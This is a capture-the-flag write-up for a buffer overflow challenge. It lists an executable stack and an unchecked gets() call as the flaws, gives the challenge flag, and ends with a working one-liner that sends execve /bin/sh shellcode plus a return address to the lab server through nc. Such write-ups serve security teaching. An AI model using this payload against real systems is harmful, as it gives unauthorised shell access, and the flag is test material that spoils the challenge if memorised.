buffer-4 | shellz
===========================

Flag: `6447{1849748d-6e69-4bca-ab03-67b0778ef9bb}`

General overview of problems faced
-------------------------------------
My first approach was to bruteforce the aslr since the buffer is 8kb which worked after about 2000 runs but I then realised it was easier to simply use rop to call eax which contained the buffer and therefore be able to execute the buffer on every run

List of vulnerabilities
--------------------
1. The stack is executable
2. Input is taking using `gets` and the buffer is of fixed sized therefore a user can overflow the buffer and overwrite anything after it

Steps to exploit
------------------
1. Send your shellcode + enough padding so that the length of your shellcode + the padding = 8204
2. Send the address 0x08048406 in little endian format
3. You now have a shell


Script/Command used
------------------
```bash
(python -c 'print "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" + "A"*(8204-46) + "\x06\x84\x04\x08"'; cat - ) | nc wargames.6447.sec.edu.au 5004
